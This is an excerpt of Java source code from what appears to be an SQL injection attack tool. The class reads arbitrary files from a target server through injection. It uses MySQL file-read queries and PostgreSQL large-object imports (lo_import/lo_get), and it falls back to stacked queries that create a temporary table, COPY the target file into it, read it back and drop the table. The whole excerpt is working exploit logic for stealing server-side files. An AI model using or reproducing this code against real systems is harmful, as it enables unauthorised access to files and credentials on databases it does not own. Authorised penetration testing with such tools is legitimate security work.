17  /**
18   * Thread unit to read source of a file by SQL injection.
19   * User can interrupt the process and get a partial result of the file content.
20   */
21  public class CallableFile implements Callable<CallableFile> {
22      
23      /**
24       * Log4j logger sent to view.
25       */
26      private static final Logger LOGGER = LogManager.getRootLogger();
27      
28      /**
29       * Path to the file to read.
30       */
31      private final String pathFile;
32  
33      /**
34       * Source of file.
35       */
36      private String sourceFile = StringUtils.EMPTY;
37      
38      /**
39       * Suspendable task that reads lines of the file by injection.
40       */
41      private final SuspendableGetRows suspendableReadFile;
42  
43      private final InjectionModel injectionModel;
44      
45      /**
46       * Create Callable to read a file.
47       */
48      public CallableFile(String pathFile, InjectionModel injectionModel) {
49          this.pathFile = pathFile;
50          this.injectionModel= injectionModel;
51          this.suspendableReadFile = new SuspendableGetRows(injectionModel);
52      }
53      
54      /**
55       * Read a file on the server using SQL injection.
56       * Get partial result if user interrupts the process.
57       */
58      @Override
59      public CallableFile call() throws Exception {
60          var sourcePage = new String[]{ StringUtils.EMPTY };
61  
62          String resultToParse = StringUtils.EMPTY;
63          try {
64              if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()) {
65                  resultToParse = this.suspendableReadFile.run(
66                      this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
67                      sourcePage,
68                      false,
69                      1,
70                      MockElement.MOCK,
71                      "mysql#file"
72                  );
73              } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getPostgres()) {
74                  try {
75                      resultToParse = this.suspendableReadFile.run(
76                          this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
77                          sourcePage,
78                          false,
79                          1,
80                          MockElement.MOCK,
81                          "pg#file"
82                      );
83                  } catch (InjectionFailureException e) {
84                      LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read data folder failure, trying with large object");
85                      var loid = this.injectionModel.getResourceAccess().getResultWithCatch("SELECT lo_import('"+ this.pathFile +"')::text", "pg#add-loid");
86                      if (StringUtils.isNotEmpty(loid)) {
87                          resultToParse = this.injectionModel.getResourceAccess().getResultWithCatch("SELECT convert_from(lo_get("+ loid +"),'utf8')::text", "pg#read-lo");
88                      }
89                      if (StringUtils.isEmpty(resultToParse)) {
90                          LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read large object failure, trying with stack read");
91                          var nameLibraryRandom = "tmp_" + RandomStringUtils.secure().nextAlphabetic(8);  // no dash in table name
92                          this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
93                          this.injectionModel.injectWithoutIndex(";create table " + nameLibraryRandom + "(data text);", "pg#add-tbl");
94                          this.injectionModel.injectWithoutIndex(";copy " + nameLibraryRandom + "(data) from '" + this.pathFile + "' delimiter E'\\x01';", "pg#copy");
95                          resultToParse = this.suspendableReadFile.run(
96                              "array_to_string(array(select * from " + nameLibraryRandom + "),'\\n')",
97                              sourcePage,
98                              false,
99                              1,
100                             MockElement.MOCK,
101                             "pg#get-tbl"
102                         );
103                         this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
104                     }
105                 }
106             }
107         } catch (InjectionFailureException e) {
108             // Usually thrown if File does not exist
109             LOGGER.log(LogLevelUtil.IGNORE, e);
110         } catch (StoppedByUserSlidingException e) {
111             // Get partial source
112             if (StringUtils.isNotEmpty(e.getSlidingWindowAllRows())) {
113                 resultToParse = e.getSlidingWindowAllRows();
114             } else if (StringUtils.isNotEmpty(e.getSlidingWindowCurrentRows())) {
115                 resultToParse = e.getSlidingWindowCurrentRows();
116             }
117             LOGGER.log(LogLevelUtil.IGNORE, e);
118         }
119         
120         this.sourceFile = resultToParse;
121         return this;
122     }
